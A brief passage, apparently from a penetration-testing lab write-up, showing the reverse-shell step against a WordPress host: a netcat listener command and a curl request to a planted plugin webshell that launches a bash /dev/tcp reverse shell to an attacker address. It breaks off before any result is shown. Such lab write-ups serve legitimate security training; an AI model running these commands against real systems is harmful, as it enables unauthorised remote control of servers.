## Step 6 - Reverse Shell

Started listener:

nc -lvnp 4444

Triggered reverse shell:

curl "http://offsecwp/wp-content/plugins/webshell/webshell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.45.229/4444+0>%261'"

### Result

Received reverse shell as:

